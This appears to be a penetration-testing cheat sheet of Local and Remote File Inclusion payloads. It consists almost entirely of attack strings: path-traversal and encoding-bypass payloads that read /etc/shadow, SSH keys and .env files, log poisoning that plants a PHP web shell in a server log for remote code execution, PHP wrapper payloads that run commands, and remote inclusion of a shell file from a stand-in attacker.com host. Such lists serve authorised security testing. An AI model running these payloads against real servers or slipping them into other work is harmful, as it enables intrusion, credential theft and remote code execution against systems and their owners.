# LFI / RFI Payloads

## Basic LFI
```
../../../../etc/passwd
../../../../etc/hosts
../../../../etc/shadow
../../../../etc/issue
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../proc/version
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
```

## Bypass — Null Byte (PHP < 5.3.4)
```
../../../../etc/passwd%00
../../../../etc/passwd\0
../../../../etc/passwd%00.jpg
```

## Bypass — Double Encoding
```
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

## Bypass — Path Truncation
```
../../../../etc/passwd.......................
../../../../etc/passwd/./././././././././././
```

## Bypass — Filter Evasion
```
....//....//....//etc/passwd
..././..././..././etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..\\..\\..\\ etc\\passwd
```

## Interesting Linux Files
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/crontab
/etc/cron.d/
/root/.bash_history
/root/.ssh/id_rsa
/home/USER/.ssh/id_rsa
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/www/html/config.php
/var/www/html/.env
```

## Interesting Windows Files
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\htdocs\config.php
```

## Log Poisoning → RCE
```
# 1. Poison Apache log with PHP code:
curl "https://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# 2. Include the log:
?page=../../../../var/log/apache2/access.log&cmd=id

# Nginx:
?page=../../../../var/log/nginx/access.log&cmd=id
```

## PHP Wrappers
```
# Read PHP source
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=string.rot13/resource=index.php

# Execute code
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Input (POST body as include)
?page=php://input
POST body: <?php system('id'); ?>

# Expect (if enabled)
?page=expect://id
```

## RFI
```
?page=http://attacker.com/shell.txt
?page=https://attacker.com/shell.txt
?page=ftp://attacker.com/shell.txt
?page=\\attacker.com\share\shell.txt
```

## Common Vulnerable Parameters
```
page=
file=
path=
include=
template=
view=
doc=
document=
folder=
root=
pg=
style=
pdf=
lang=
language=
locale=
```
